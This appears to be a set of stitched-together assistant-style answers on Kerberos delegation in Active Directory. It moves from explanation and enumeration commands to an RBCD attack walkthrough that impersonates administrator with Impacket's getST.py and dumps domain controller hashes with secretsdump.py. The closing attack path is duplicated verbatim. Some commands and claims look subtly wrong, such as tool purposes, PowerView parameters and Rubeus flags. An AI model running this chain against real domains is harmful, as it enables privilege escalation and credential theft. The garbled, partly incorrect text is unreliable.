### Constrained Delegation with Protocol Transition: Explanation and Implications

Constrained delegation is a Kerberos extension that allows a service (like a web server) to impersonate a user and access resources on another service (like a database server) on behalf of the user. However, the delegation is constrained in that the service can only delegate to specific services that have been explicitly allowed by an administrator. Let's break down the scenario you've described, including the case with and without Protocol Transition.

#### Constrained Delegation without Protocol Transition

In the standard constrained delegation scenario, the process works as follows:

1. **User Authenticates to Web Server**: The user authenticates to the web server using Kerberos and presents a Service Ticket (ST) or Ticket Granting Service (TGS) ticket.
   
2. **Web Server Requests Access to DB Server**: The web server needs to authenticate to the database server as the user. It sends a TGS request to the Domain Controller (DC) asking for a ticket to access the database server, attaching the user's TGS ticket to prove that the user has authenticated to the web server.

3. **DC Verifies Delegation Rights**: The DC checks whether the web server is allowed to delegate to the database server and whether the user's TGS ticket has the "forwardable" flag. If these conditions are met, the DC issues a new TGS ticket that allows the web server to act as the user when accessing the database server.

4. **Web Server Accesses DB Server as the User**: The web server uses the new TGS ticket to authenticate to the database server as if it were the user, accessing only the resources that the user is allowed to access.

#### Constrained Delegation with Protocol Transition (S4U2Self and S4U2Proxy)

**Protocol Transition** adds an extra layer of flexibility by allowing the web server to request a Kerberos ticket on behalf of a user, even if the user did not originally authenticate using Kerberos (e.g., authenticated using NTLM).

Here’s how it works:

1. **User Authenticates to Web Server using NTLM**: The user authenticates to the web server using NTLM instead of Kerberos. NTLM does not provide a TGS ticket.

2. **Web Server Requests a TGS Ticket Using S4U2Self**: The web server uses the S4U2Self (Service for User to Self) extension to request a TGS ticket from the DC on behalf of the user, even though the user did not use Kerberos for initial authentication. This is possible only if the web server has been configured with "Constrained Delegation with Protocol Transition."

3. **DC Issues a TGS Ticket**: The DC checks the web server's rights and issues a TGS ticket for the web server to use, as if the user had authenticated via Kerberos. This ticket will have the forwardable flag set if the delegation is configured correctly.

4. **Web Server Requests Access to DB Server Using S4U2Proxy**: Now, the web server uses the S4U2Proxy (Service for User to Proxy) extension to request a TGS ticket to access the database server as the user. This involves sending the user's TGS ticket (obtained via S4U2Self) to the DC.

5. **DC Verifies and Issues a TGS Ticket for the DB Server**: The DC verifies that the web server is allowed to delegate to the database server and issues a TGS ticket that the web server can use to authenticate to the database server as the user.

6. **Web Server Accesses DB Server as the User**: Finally, the web server uses this TGS ticket to access the database server on behalf of the user.

### What If Protocol Transition Is Not Enabled?

If Protocol Transition (S4U2Self) is not enabled, the web server cannot obtain a TGS ticket for the user if the user did not authenticate using Kerberos in the first place. This means:

- If the user authenticates using NTLM, the web server cannot impersonate the user to access the database server.
- The web server can only delegate when the user authenticates using Kerberos and provides a TGS ticket that can be forwarded.

### Security Considerations

Constrained delegation with Protocol Transition (S4U2Self) is powerful but potentially risky:

- **Risk of Over-Delegation**: If not carefully configured, a service might gain the ability to impersonate users more broadly than intended.
- **Privilege Escalation**: If a compromised service account has delegation rights, an attacker could leverage this to escalate privileges or move laterally within the network.

### Summary

- **Without Protocol Transition**: Constrained delegation only works if the user initially authenticates using Kerberos.
- **With Protocol Transition**: The service can request Kerberos tickets on behalf of a user, even if the user used NTLM or another non-Kerberos method for initial authentication. This requires specific configuration and permissions.

Understanding these nuances is crucial for both securing your environment and identifying potential attack vectors.


Enumerating constrained delegation and identifying potential attack vectors in a Windows environment can be accomplished using both PowerShell and Python. These tools allow you to gather information on the configuration of delegation rights, which can then be analyzed to identify possible weaknesses that attackers might exploit.

### PowerShell Methods

PowerShell is a powerful tool for querying Active Directory and finding delegation settings. Below are some scripts and commands that you can use.

#### 1. **Querying for Accounts with Constrained Delegation**

You can search for accounts with constrained delegation by querying for the `msDS-AllowedToDelegateTo` attribute, which specifies the services to which an account can delegate.

```powershell
# Get all accounts with constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo | Select-Object Name, msDS-AllowedToDelegateTo

Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo | Select-Object Name, msDS-AllowedToDelegateTo
```

#### 2. **Finding All Delegation Settings (Including Unconstrained Delegation)**

Unconstrained delegation is more dangerous and can be enumerated as follows:

```powershell
# Get all accounts with unconstrained delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name

Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name
```

#### 3. **Identify Services Vulnerable to Protocol Transition (S4U2Self)**

You can find services that are configured to use protocol transition (S4U2Self) as follows:

```powershell
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo | Select-Object Name, UserPrincipalName, ServicePrincipalName, msDS-AllowedToDelegateTo
```

This command identifies user accounts that can request a ticket on behalf of another user (S4U2Self) and then delegate that ticket to other services (S4U2Proxy).

### Python Methods

Python can also be used for these purposes, particularly in a more automated or cross-platform environment. Below are some Python-based approaches.

#### 1. **Using the `impacket` Library**

The `impacket` library by SecureAuth Corporation is commonly used for Kerberos-related enumeration, including delegation.

- **Enumerating Constrained Delegation**

You can use the `GetUserSPNs.py` tool from Impacket to enumerate users who have constrained delegation rights:

```bash
python3 GetUserSPNs.py -dc-ip <DomainControllerIP> -request <Domain>/<Username>:<Password>
```

- **Enumerating Delegation Rights**

You can modify existing Impacket scripts or write a custom script using LDAP queries to extract delegation rights:

```python
from impacket.ldap import ldap, ldapasn1

ldapConnection = ldap.LDAPConnection('ldap://<DomainController>', '<Domain>')
ldapConnection.login('<username>', '<password>', '<domain>', lmhash='', nthash='')

searchFilter = "(msDS-AllowedToDelegateTo=*)"
resp = ldapConnection.search(searchFilter=searchFilter, attributes=['msDS-AllowedToDelegateTo'])

for item in resp:
    print(item['dn'])
    print(item['attributes'])
```

### Attack Scenarios Based on Enumeration

Once you've identified accounts with constrained delegation rights, you can assess potential attack vectors:

1. **Service Ticket Abuse (S4U2Self and S4U2Proxy)**
   - If you find an account that has delegation rights to a highly privileged service (e.g., SQL Server), you might be able to abuse this to impersonate an administrator.

2. **Service Account Compromise**
   - Accounts with delegation rights are often service accounts, which may have weaker passwords or be less monitored. Compromising such an account can lead to lateral movement.

3. **Unconstrained Delegation**
   - Accounts with unconstrained delegation allow an attacker who compromises the account to impersonate any user who authenticates to the server. This is particularly dangerous.

### Summary

PowerShell and Python offer robust capabilities for enumerating delegation rights in Active Directory. By identifying which accounts have delegation rights, particularly constrained or unconstrained delegation, you can pinpoint potential attack vectors and assess the risk associated with those accounts. Tools like PowerShell's `Get-ADUser` and `Get-ADComputer` cmdlets, along with Python's `impacket` library, can be instrumental in this process.


Resource-Based Constrained Delegation (RBCD) allows a resource (e.g., a service) to specify which other services can act on its behalf. This is different from traditional constrained delegation, where the service itself has the delegation rights. In RBCD, the delegation rights are controlled by the resource. This mechanism can be exploited if you can compromise or control a service account that is allowed to delegate to a more privileged service.

### How RBCD Works

1. **S4U2Self (Service for User to Self)**: A service account requests a service ticket on behalf of a user to itself. This is done with the `S4U2Self` extension. However, if the ticket does not have the forwardable flag, it cannot be delegated further.

2. **S4U2Proxy (Service for User to Proxy)**: If the ticket is forwardable, the service account can request a ticket to another service using the `S4U2Proxy` extension. The resource-based constrained delegation mechanism checks if the service is allowed to delegate to the target service.

3. **RBCD (Resource-Based Constrained Delegation)**: In RBCD, the resource (e.g., the database server) has a list of service accounts that it trusts to act on behalf of users. This list is stored in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the resource's computer object.

### Using RBCD in the Given Scenario

If you're dealing with a scenario where `S4U2Proxy` isn't working because the ticket is missing the forwardable flag, you can use RBCD by configuring the resource (e.g., `delegator$`) to trust your service account.

### Tools for Exploiting RBCD

#### 1. **Impacket Tools**

Impacket provides tools that can help in configuring and exploiting RBCD:

- **addcomputer.py**: This Impacket tool allows you to add a computer account to the domain. You can use it to add an account with controlled delegation rights.

```bash
python3 addcomputer.py -method LDAPS -domain <domain> -username <user> -password <password> -dc-ip <dc-ip>
```

- **rbcd.py**: A custom script in Impacket (or others you can find) to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

Here's a general example:

```bash
python3 rbcd.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -target <TARGET_SERVER> -sid <SID_OF_ATTACKER_SERVICE_ACCOUNT>
```

- **getST.py**: After setting up RBCD, you can use the `getST.py` to request a ticket for the target service using your controlled service account.

```bash
python3 getST.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -spn <SERVICE/INSTANCE> -impersonate <ADMIN_USER> -self
```

#### 2. **PowerShell Tools**

PowerShell can be used to configure and exploit RBCD as well:

- **PowerView**: PowerView (part of PowerShell Empire) is a useful tool for querying and modifying Active Directory delegation settings.

```powershell
# Add RBCD delegation rights to a target machine
$MachineSID = (Get-ADComputer -Identity "TARGET_MACHINE").SID.Value
$Object = Get-ADComputer -Identity "DELEGATED_MACHINE"

$SD = Get-ADComputer $MachineSID -Property "msDS-AllowedToActOnBehalfOfOtherIdentity"
$SecurityDescriptor = [System.DirectoryServices.ActiveDirectorySecurity]::new()
$SecurityDescriptor.SetSecurityDescriptorSddlForm($SD."msDS-AllowedToActOnBehalfOfOtherIdentity")
$IdentityReference = New-Object System.Security.Principal.SecurityIdentifier $Object.ObjectSID
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$SecurityDescriptor.AddAccessRule($ace)
$SD."msDS-AllowedToActOnBehalfOfOtherIdentity" = $SecurityDescriptor.GetSecurityDescriptorSddlForm("All")
Set-ADComputer $MachineSID -Replace $SD
```

This script adds a delegation rule to allow `DELEGATED_MACHINE` to act on behalf of any user to `TARGET_MACHINE`.

### Steps to Exploit RBCD

1. **Identify a Machine for Delegation**: Find a target machine where you want to perform delegation (e.g., a SQL Server or another service running under a privileged account).

2. **Control a Service Account**: Either compromise an existing account with delegation rights or create a new one using `addcomputer.py`.

3. **Set Up RBCD**: Modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target machine to include your controlled service account.

4. **Request a Ticket**: Use `getST.py` with the `-self` flag to obtain a service ticket for the target user (e.g., `administrator`) to your controlled service.

5. **Use the Ticket**: Finally, leverage the obtained ticket to perform actions on behalf of the target user.

### Conclusion

Resource-Based Constrained Delegation provides an effective way to perform privilege escalation, especially in scenarios where traditional delegation mechanisms are not applicable. Using tools like Impacket and PowerView, you can set up and exploit RBCD to act as privileged users within the domain. This approach requires careful planning and execution, as it relies on modifying Active Directory attributes and carefully choosing target machines for delegation.


To identify accounts that can request service tickets for any user in a domain or on a specific computer, you're generally looking for accounts that have been configured for constrained delegation with the "Trust this user for delegation to any service (Kerberos only)" setting. Additionally, you might be interested in accounts with the "Trust this computer for delegation to specified services only" setting, especially when considering Resource-Based Constrained Delegation (RBCD).

### Steps to Find Such Accounts

#### 1. **PowerShell with Active Directory Module**

You can use PowerShell with the Active Directory module to search for accounts that have delegation permissions.

- **Find Accounts Trusted for Constrained Delegation:**

```powershell
# This command lists all accounts that are trusted for delegation in the domain
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Property Name, SamAccountName, UserPrincipalName, TrustedForDelegation
```

- **Find Computers Trusted for Constrained Delegation:**

```powershell
# This command lists all computers that are trusted for delegation in the domain
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Property Name, SamAccountName, TrustedForDelegation
```

- **Find Accounts with Resource-Based Constrained Delegation:**

For RBCD, you need to check the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:

```powershell
# Search for computers with Resource-Based Constrained Delegation enabled
Get-ADComputer -Filter * -Property msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null } | Select-Object Name,msDS-AllowedToActOnBehalfOfOtherIdentity
```

- **Identify Accounts Allowed for Delegation to Any Service (All Services in Domain):**

```powershell
# List users/computers that are allowed to delegate to any service
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Property Name, SamAccountName, UserPrincipalName, TrustedToAuthForDelegation
```

#### 2. **Find Accounts Trusted to Request Service Tickets for Any User**

You need to look for accounts or computers with the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute set or `TrustedForDelegation` flags enabled.

#### 3. **Ensure Tickets are Forwardable**

When you obtain a service ticket using the `S4U2Self` extension (where a service requests a ticket to itself on behalf of a user), the ticket must be forwardable if you intend to use it for further delegation (via `S4U2Proxy`).

- **Verify Forwardable Flag in Ticket:**

After requesting a ticket, you can inspect it with tools like `klist` (on Windows) or using a tool like `Rubeus` to ensure the ticket is forwardable.

- **Example with Rubeus**:

```powershell
Rubeus.exe tgtdeleg /user:<username> /rc4:<hash> /domain:<domain> /target:<targetserver>
```

This command requests a TGT and checks if it’s forwardable.

### Important Considerations

- **Forwardable Flag**: For tickets to be used in delegation (e.g., when using `S4U2Proxy`), they must have the forwardable flag set. This flag allows the ticket to be used on another server as if the user was presenting it themselves.

- **Permissions**: The permissions to delegate, request, or use tickets are tightly controlled by the domain’s security policies, and specific delegation rights need to be configured for the accounts in question.

### Tools and Techniques

- **PowerView** (from PowerSploit): Can be used for enumeration as well.

- **SharpHound/BloodHound**: Excellent tools to map out delegation rights and potential attack paths.

- **Impacket**: Contains scripts like `getST.py` that can be used to manually request service tickets and validate if they are forwardable.

### Summary

1. **Enumerate Accounts with Delegation Rights**: Use PowerShell, PowerView, or other tools to find accounts that can delegate.
   
2. **Check Forwardable Flag**: Ensure the service tickets are forwardable for further use.

3. **Investigate Attack Paths**: Use tools like BloodHound to map out delegation and potential escalation paths.

By following these steps, you can identify accounts with the ability to request service tickets on behalf of any user, and determine if those tickets can be used in attacks like Kerberos delegation or privilege escalation.

Resource-Based Constrained Delegation (RBCD) allows an attacker to impersonate another user and access resources by exploiting delegation rights configured on a resource (e.g., a service on a domain controller). By obtaining a ticket as a machine account, you can leverage this to dump hashes from a Domain Controller (DC).

### Step 1: Set Up the RBCD Environment
You need to identify a vulnerable machine account that you can manipulate for RBCD.

1. **Enumerate Trusted Accounts:**
   - Use PowerView or Impacket tools to enumerate accounts that have `msDS-AllowedToActOnBehalfOfOtherIdentity` set, indicating they can perform RBCD.

2. **Set Up RBCD for the Target Machine:**
   - If you have administrative access to a machine, use tools like `Set-DomainObject` from PowerView or `Add-DomainObjectAcl` from PowerSploit to configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on the target machine.

   ```powershell
   # PowerView command to set RBCD
   Set-DomainObject -SearchBase "CN=Computers,DC=example,DC=com" -Identity "TARGET_MACHINE$" -AllowToActOnBehalfOfOther -UserOrGroupToImpersonate "VICTIM_MACHINE$"
   ```

### Step 2: Requesting and Forwarding a Ticket Using RBCD

1. **Get a Ticket Using `S4U2Self`:**
   - Use **Impacket’s `getST.py`** script to get a ticket for the target user on the target service (machine).

   ```bash
   python3 getST.py example.com/attacker_machine\$:<password> -spn cifs/target_machine -impersonate administrator -dc-ip <DC_IP> -use-rc4 -no-pass
   ```

   This will request a ticket for the `administrator` user that can be used by the `attacker_machine`.

2. **Forward the Ticket Using `S4U2Proxy`:**
   - Use the ticket obtained from the previous step and forward it to the target machine using `S4U2Proxy`.

   ```bash
   python3 getST.py example.com/attacker_machine\$:<password> -spn cifs/target_machine -impersonate administrator -dc-ip <DC_IP> -use-rc4 -no-pass -tgs example_com_ccache
   ```

   This will create a valid TGS ticket for the `administrator` to access `cifs/target_machine`.

### Step 3: Dumping Hashes from the Domain Controller Using the Ticket

1. **Set the KRB5CCNAME Environment Variable:**

   ```bash
   export KRB5CCNAME=example_com_ccache
   ```

   This environment variable points to the TGS ticket file you generated.

2. **Use `secretsdump.py` to Dump Hashes:**

   ```bash
   python3 secretsdump.py -k -no-pass -dc-ip <DC_IP> example.com/administrator@domain_controller_name$
   ```

   - `-k`: Tells `secretsdump.py` to use Kerberos authentication.
   - `-no-pass`: Indicates that no password is needed as the TGS ticket is used.
   - `example.com/administrator@domain_controller_name$`: The target for the hash dumping, typically a Domain Controller.

### Summary of Attack Path:
1. **Configure RBCD**: Set up the machine to allow delegation.
2. **Request and Forward Ticket**: Obtain and forward a TGS ticket using Impacket.
3. **Dump Hashes**: Use `secretsdump.py` with the TGS ticket to dump hashes from the DC.

This attack path allows you to impersonate a privileged account and perform sensitive operations on a Domain Controller, including dumping password hashes.

Resource-Based Constrained Delegation (RBCD) allows an attacker to impersonate another user and access resources by exploiting delegation rights configured on a resource (e.g., a service on a domain controller). By obtaining a ticket as a machine account, you can leverage this to dump hashes from a Domain Controller (DC).

### Step 1: Set Up the RBCD Environment
You need to identify a vulnerable machine account that you can manipulate for RBCD.

1. **Enumerate Trusted Accounts:**
   - Use PowerView or Impacket tools to enumerate accounts that have `msDS-AllowedToActOnBehalfOfOtherIdentity` set, indicating they can perform RBCD.

2. **Set Up RBCD for the Target Machine:**
   - If you have administrative access to a machine, use tools like `Set-DomainObject` from PowerView or `Add-DomainObjectAcl` from PowerSploit to configure the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on the target machine.

   ```powershell
   # PowerView command to set RBCD
   Set-DomainObject -SearchBase "CN=Computers,DC=example,DC=com" -Identity "TARGET_MACHINE$" -AllowToActOnBehalfOfOther -UserOrGroupToImpersonate "VICTIM_MACHINE$"
   ```

### Step 2: Requesting and Forwarding a Ticket Using RBCD

1. **Get a Ticket Using `S4U2Self`:**
   - Use **Impacket’s `getST.py`** script to get a ticket for the target user on the target service (machine).

   ```bash
   python3 getST.py example.com/attacker_machine\$:<password> -spn cifs/target_machine -impersonate administrator -dc-ip <DC_IP> -use-rc4 -no-pass
   ```

   This will request a ticket for the `administrator` user that can be used by the `attacker_machine`.

2. **Forward the Ticket Using `S4U2Proxy`:**
   - Use the ticket obtained from the previous step and forward it to the target machine using `S4U2Proxy`.

   ```bash
   python3 getST.py example.com/attacker_machine\$:<password> -spn cifs/target_machine -impersonate administrator -dc-ip <DC_IP> -use-rc4 -no-pass -tgs example_com_ccache
   ```

   This will create a valid TGS ticket for the `administrator` to access `cifs/target_machine`.

### Step 3: Dumping Hashes from the Domain Controller Using the Ticket

1. **Set the KRB5CCNAME Environment Variable:**

   ```bash
   export KRB5CCNAME=example_com_ccache
   ```

   This environment variable points to the TGS ticket file you generated.

2. **Use `secretsdump.py` to Dump Hashes:**

   ```bash
   python3 secretsdump.py -k -no-pass -dc-ip <DC_IP> example.com/administrator@domain_controller_name$
   ```

   - `-k`: Tells `secretsdump.py` to use Kerberos authentication.
   - `-no-pass`: Indicates that no password is needed as the TGS ticket is used.
   - `example.com/administrator@domain_controller_name$`: The target for the hash dumping, typically a Domain Controller.

### Summary of Attack Path:
1. **Configure RBCD**: Set up the machine to allow delegation.
2. **Request and Forward Ticket**: Obtain and forward a TGS ticket using Impacket.
3. **Dump Hashes**: Use `secretsdump.py` with the TGS ticket to dump hashes from the DC.

This attack path allows you to impersonate a privileged account and perform sensitive operations on a Domain Controller, including dumping password hashes.